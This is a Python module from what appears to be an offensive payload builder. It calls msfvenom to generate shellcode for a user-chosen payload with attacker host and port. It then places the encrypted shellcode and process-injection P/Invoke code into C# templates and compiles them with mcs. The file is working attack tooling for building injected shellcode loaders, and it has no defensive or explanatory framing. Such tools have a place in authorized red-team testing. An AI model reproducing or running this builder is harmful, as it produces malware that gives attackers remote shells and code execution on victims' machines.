import subprocess
from lib.init import *
from lib.args import *

script_path = os.path.dirname(os.path.abspath(__file__))

# generate msfvenom or custom shellcode
def choose_shellcode(custom):
    if(custom):
        shellcode_hex = args.shellcode
        return shellcode_hex
    else:
        op = subprocess.run(f"msfvenom -p {args.payload} LHOST={args.lh} LPORT={args.lp} -a {args.arch} -f hex".split(), capture_output=True)
        if op.returncode != 0:
            print(Fore.RED + Style.BRIGHT + "[!] MSFVenom Execution Error")
            print(Fore.RED + op.stderr.decode())
            exit()
        shellcode_hex = op.stdout.decode()
        return shellcode_hex

# create csharp file based on input from template
def generate_cs_file(binary, encrypted_base64_blob, injection_technique):
    with open(f"{script_path}/../cs_templates/{binary}.cs","r") as file:
        template = file.read()
        template = template.replace('{encrypted_shellcode}', 'string bufEnc = "'+encrypted_base64_blob+'";')
        template = template.replace('{pinvoke_code}', injection_list['injection_techniques'][f'{injection_technique}']['pinvoke_imports'])
        template = template.replace('{injection_logic}', injection_list['injection_techniques'][f'{injection_technique}']['code'])

    with open(f"{script_path}/../payload_{binary}.cs", "w") as file:
        file.write(template)

# compile csharp file using mcs
def mcs_compile(command):
    op = subprocess.run(command.split(), capture_output=True)
    if op.returncode != 0:
        print(Fore.RED + Style.BRIGHT + "[!] MCS Execution Error")
        print(Fore.RED + op.stderr.decode())
        exit()
    else:
        return True